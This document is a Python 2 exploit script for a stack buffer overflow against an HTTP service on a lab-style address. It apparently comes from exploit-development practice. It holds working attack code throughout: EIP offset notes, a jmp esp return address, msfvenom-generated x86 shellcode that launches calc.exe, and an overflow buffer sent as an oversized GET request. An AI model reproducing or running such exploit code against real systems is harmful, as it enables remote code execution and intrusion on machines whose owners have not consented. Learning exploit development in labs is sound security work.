#!/usr/bin/env python2

import socket
import struct

RHOST = "10.10.10.2"
RPORT = 80

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# appears to break at 5000

# offsets
# EIP 1786
# ESP 1790
# EBX 1782

# pointers
# jmp_esp in ntldll.dll at 76dfe871
jmp_esp = 0x76dfe871

# msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread --var-name shellcode -a x86 -f python -b "\x00\x0A\x0D"

shellcode =  b""
shellcode += b"\xbf\x5e\xfc\xa0\xbb\xda\xd5\xd9\x74\x24\xf4"
shellcode += b"\x5e\x29\xc9\xb1\x31\x83\xee\xfc\x31\x7e\x0f"
shellcode += b"\x03\x7e\x51\x1e\x55\x47\x85\x5c\x96\xb8\x55"
shellcode += b"\x01\x1e\x5d\x64\x01\x44\x15\xd6\xb1\x0e\x7b"
shellcode += b"\xda\x3a\x42\x68\x69\x4e\x4b\x9f\xda\xe5\xad"
shellcode += b"\xae\xdb\x56\x8d\xb1\x5f\xa5\xc2\x11\x5e\x66"
shellcode += b"\x17\x53\xa7\x9b\xda\x01\x70\xd7\x49\xb6\xf5"
shellcode += b"\xad\x51\x3d\x45\x23\xd2\xa2\x1d\x42\xf3\x74"
shellcode += b"\x16\x1d\xd3\x77\xfb\x15\x5a\x60\x18\x13\x14"
shellcode += b"\x1b\xea\xef\xa7\xcd\x23\x0f\x0b\x30\x8c\xe2"
shellcode += b"\x55\x74\x2a\x1d\x20\x8c\x49\xa0\x33\x4b\x30"
shellcode += b"\x7e\xb1\x48\x92\xf5\x61\xb5\x23\xd9\xf4\x3e"
shellcode += b"\x2f\x96\x73\x18\x33\x29\x57\x12\x4f\xa2\x56"
shellcode += b"\xf5\xc6\xf0\x7c\xd1\x83\xa3\x1d\x40\x69\x05"
shellcode += b"\x21\x92\xd2\xfa\x87\xd8\xfe\xef\xb5\x82\x94"
shellcode += b"\xee\x48\xb9\xda\xf1\x52\xc2\x4a\x9a\x63\x49"
shellcode += b"\x05\xdd\x7b\x98\x62\x01\x9e\x09\x9e\xaa\x07"
shellcode += b"\xd8\x23\xb7\xb7\x36\x67\xce\x3b\xb3\x17\x35"
shellcode += b"\x23\xb6\x12\x71\xe3\x2a\x6e\xea\x86\x4c\xdd"
shellcode += b"\x0b\x83\x2e\x80\x9f\x4f\x9f\x27\x18\xf5\xdf"

eip_offset = 1786
buf_len = 5000

# badchars = [0x00, 0x0A, 0x0D]

padding = "A" * eip_offset
eip = struct.pack("<I", jmp_esp)
nop = "\x90" * 32
# shellcode = "\xCC\xCC\xCC\xCC"
esp_content = "C" * (buf_len - len(padding) - len(eip) - len(nop) - len(shellcode))

buf = padding + eip + nop + shellcode + esp_content

s.send("GET /" + buf + " HTTP/1.1\r\n\r\n")

s.close()

